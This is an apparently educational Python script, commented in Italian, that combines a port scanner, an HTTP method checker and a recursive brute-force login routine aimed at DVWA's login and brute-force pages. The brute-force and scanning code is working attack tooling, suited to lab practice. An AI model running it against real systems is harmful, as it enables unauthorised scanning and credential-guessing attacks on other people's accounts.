### IMPORT MODULI ESTERNI

#import dei moduli esterni
#socket --> introdotta per la gestione della connessione socket -- usata per portScanning.py
#ipaddress --> introdotta per la validazione dell'ip -- usata per tutti gli script ch erichiedevano l'input utente di un ip
#http.client --> per effettuare connessioni http e ricevere i dati di risposta (header, body etc.) -- usata per checkHttpMethod.py
#requests --> per manipolare tramite i cookie di sessione gli accessi alle pagine web del bruteforce -- usata per bruteForce.py
import http.client, socket, ipaddress, requests, time

### DEFINIZIONE FUNZIONI

#funzione per la validazione dell'indirizzo ip inserito
def is_valid_ip(ip_address):
    #se l'ip è valido ritorna True
    try:
        #ip_address riceve in input la stringa dell'ip e se non è valido genera una eccezione
        ipaddress.ip_address(ip_address)
        return True
    #se entra in exception restituisce false
    except ValueError:
        #chiedo all'utenet di inserire un IP valido
        print("Inserisci una stringa con indirizzo IP valido (e.g. 192.168.1.6) \n")
        return False
    
#funzione per la scansione multiporta su un target specifico
def scanning_port(ip, min_port, max_port, protocol_in, format):
    for port in range(min_port, max_port + 1):
        #verifica del protocollo richiesto per la creazione dell'istanza socket 
        if(protocol_in == "TCP" or protocol_in == "tcp"):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        elif(protocol_in == "UDP" or protocol_in == "udp"):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            print ("Il protocollo richiesto non è valido!\n")
            return 0
        #iterazione dalla porta minima alla porta massima richiesta
        #esegue la connessione porta per porta
        status = s.connect_ex((ip, port))
        #se la connessione è OK stampa OPEN altrimenti CLOSED
        #connect_ex ritorna 0 in caso di successo
        #gli if sulla variabile format servono a verificare il formato di output scelto dall'utente
        if (status == 0):
             if(format == 1 or format == 3):
                print ('Porta ', port, ' ', protocol_in, ' OPEN')
        else:
            if(format == 2 or format == 3):
                print ('Porta ', port, ' ', protocol_in, ' CLOSED')
        #chiusura della connessione
        s.close()

#funzione per la restituzione dello status code del metodo http indicato
def get_status_http_method(ip, port, path, http_method):
    #N.B. --> 405 Method Not Allowed
    #inizializzo la variabile response per check successivo
    response = None
    #try-except per gestire l'eccezzione nella connessione
    try:
        #la funzione http.client.HTTPConnection prende in input i parametri host, porta.
        #la funzione restituisce l’oggetto connection. 
        connection = http.client.HTTPConnection(ip, port)
        #invio richiesta indicando metodo e path per RequestURI
        connection.request(http_method, path)
        #salvataggio risposta server
        response = connection.getresponse()
        #print ("I metodi abilitati sono: ", response.getheader('Allow'))
        #chiusura connessione
        connection.close()
        #return con valori contenuti nel tag Allow
    #gestione eccezione Connessione e stampa errore
    except ConnectionRefusedError:
        print ("Connessione fallita!")
    #Se response è None non è stato possibile connettersi e ritorno uno status code di errore
    if(response):
        #nel caso del method OPTIONS va restituito un tag dell'header e non lo status
        if(http_method == "OPTIONS"):
            return response.getheader('Allow')
            #se il metodo non è OPTIONS dovrò sempre restituire lo status
        else:
            return response.status
    else:
        #restituisco un valore corrispondente ad un error code status
        return 500

#funzione per ottenere il valore dall'header PHPSESSID
#deve ricevere il payload (corrisponderà al dizionario coi parametri get della url da passare)
#deve ricevere l'url dalla quale estrarre il valore PHPSESSID
def get_session_id(payload, url):
    #costruzione del dizionario per l'header
    headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
    #creazione di una sessione permanente altrimenti il token generato cambia ad ogni nuova richiesta della url
    session = requests.Session()
    #inizializza l'ogetto della pagian target dalla quale otterrà il token
    #viene sfruttato il metodo get che riceve url, header e parametri del get tramite parametro params (e.g. username=admin&password=pluto)
    target_page_obj_sess = session.get(url, headers = headers_login, params = payload)
    #estraggo dal dizionario generato nell'oggetto della pagina target il PHPSESSID
    phpsessid = target_page_obj_sess.cookies['PHPSESSID']
    #ritorna il valore estratto
    return phpsessid

#funzione per verificare la login con metodo post sulla prima pagina di login (.../dvwa/login.php)
#deve ricevere il payload (corrisponderà al dizionario coi parametri post del form da compilare)
#deve ricevere l'url sulla quale tentare la login
#deve ricevere un dizionario con i valori del cookie settati --> security e PHPSESSID
#deve ricevere come parametro il messaggio di errore che stampa la pagina di login in caso di login fallita
def check_login_post(payload, url, cookie, error_msg):
        #costruzione del dizionario per l'header
        headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        #inizializza l'ogetto della pagian target alla quale si deve loggare
        #viene sfruttato il metodo post che riceve url, header e parametri del post che corrispondo al name degli input type del form html tramite parametro data
        #riceve in aggiunta il dizionario dei cookie (cookies = cookie) per settare security level e PHPSESSID per mantenere la stessa sessione aperta col token precedente
        target_page_obj_post = requests.post(url, headers = headers_login, cookies = cookie ,data = payload)
        #verifico se l'errore di login ricevuto come parametro è presente nel body della pagina ottenuta
        if(error_msg in target_page_obj_post.text):
             #se si stampa messaggio login KO e torna 0
             print("Login /login.php KO!\n")
             return 0
        else:
             #se no stampa messaggio login OK e torna 1
             print("Login /login.php OK!\n")
             return 1

#funzione per verificare la login con metodo post sulla prima pagina di bruteforce (.../dvwa/vulnerabilities/brute/)
#Identica alla funzione check_login_post solo che usa i parametri get
def check_login_get(payload, url, cookie, error_msg):
        headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        target_page_obj_get = requests.get(url, headers = headers_login, cookies = cookie , params = payload)
        if(error_msg in target_page_obj_get.text):
             print("       Login /dvwa/vulnerabilities/brute/ KO!\n")
             return 0
        else:
            print("        Login /dvwa/vulnerabilities/brute/ OK!\n")
            return 1

#funzione ricorsiva che sfrutta le funzioni get_session_id, check_login_post e check_login_get per effettuare un attacco bruteforce a più livelli
#richiede in input la  lista utenti e password
#usa ip + context come parametri per costruire la url del target
#richiede il messaggio di errore che deve passare alle funzioni check_login per verificare se la login avviene con successo
#richiede il security level per inserirlo nel dizionario del cookie e per introdurre un timeout sul livello high
#richiede il dizionario cookies per distinguere il passo induttivo dalla ricorsione (quando è None, la prima login non è mai avvenuta)
def brute_force(user_list, pwd_list, ip, context, possible_err_msg, security_lev, cookies = None):
    #costruzione url per il tentativo di login
    url_login = "http://" + ip + context
    error_msg = possible_err_msg
    #iterazione con due cicli annidati per scorrere lista utenti e password
    for user in user_list:
        #pulizia di eventuali caratteri vuoti a fine riga per user ("utente " è diverso da "utente")
        user = user.rstrip()
        for pwd in pwd_list:
            #pulizia di eventuali caratteri vuoti a fine riga per pwd ("password " è diverso da "password")
            pwd = pwd.rstrip()
            #creazione dizionario per il payload i cui indici devono corrispondere al name degli input type elements della pagina html
            #operazione da effettuare dentro all'iterazione poichè user e password cambiano di volta in volta per i diversi tentativi
            payload_form_login = {'username': user, 'password': pwd, 'Login': 'Login'} 
            #se cookies è None non è mai stata effettuata una login con successo nella prima pagina di login
            if(cookies == None):
                 #stampa la pagina su cui viene effettuato l'attacco e con quali credenziali prova
                 print ("Attacco bruteforce login.php!\n")
                 print (user, "-", pwd)
                 #chiama la get_session_id per ottenere PHPSESSID e usarlo come token di sessione se la login avverrà con successo
                 sess_id = get_session_id(payload_form_login, url_login)
                 #crea il dizionario relativo al cookie per la sessione da sparare nella richiesta post nel tentativo di login
                 #contiene security level e session id
                 cookie_session = {'security': security_lev, 'PHPSESSID': sess_id}
                 #effettua il tentativo di login con la post (passando il token generato tramite cookie_session)
                 #restituisce il valore di ritorno (0 = login ko, 1 = login ok)
                 check_credentials = check_login_post(payload_form_login, url_login, cookie_session, error_msg)
                 #verifica se la login è avvenuta correttamente tramiet valore di ritorno
                 if(check_credentials == 1):
                    #se sì, stampa il session id che verrà mantenuto per tutta la durata del tentativo di bruteforce sul subcontext /brute/
                    print("Session ID:", sess_id)
                    #inizializzata la variabile del messaggio di errore login trovato relativa nella pagina /vulnerabilities/brute/
                    msg_failed_brute = '<pre><br>Username and/or password incorrect.</pre>'
                    #chiamata ricorsiva della funzione in cui viene passato il nuovo path/context per la login e il cookie_session per distinguere dal passo induttivo
                    brute_force(user_list, pwd_list, ip, "/dvwa/vulnerabilities/brute/", msg_failed_brute, security_lev, cookie_session)
                    #dopo la chiamata ricorsiva mettiamo un return 0 poichè finito lo stack della ricorsione tornerebbe ad iterare nuovamente sulle credenziali
                    #ma per la prima login sono già state trovate quelle corrette 
                    return 0
                 else:
                    #se la check_login_post non ha restituito le credenziali inserite non erano quelle valide
                    print("Credenziali non valide!")
            #dopo la chiamata ricorsiva cookies != None e quindi la login su /dvwa/login.php è avvenuta, le chiamate ricorsiva passano in questo else
            #finche non vengono trovate le credenziali valide o non termina la lista di utenti e password fornita
            else:
                 #viene indicato il nuovo context dell'attacco e le credenziali che per ricorsione ripartono dal primo elemento delle liste psw e user
                 print ("       Attacco bruteforce context /vulnerabilities/brute/!\n")
                 print ("       ",user, "-", pwd)
                 #viene effettuato un check con la funzione check_login_get secondo il medesimo principio della funzione check_login_post
                 new_check_credentials = check_login_get(payload_form_login, url_login, cookies, error_msg)
                 #con costrutto if-else verifica se la login è avvenuta correttamente oppure no
                 if(new_check_credentials == 1):
                      #se la login ha avuto successo interrompe con una return ed entrambi i context sono stati colpiti dal bruteforce con successo
                      return 0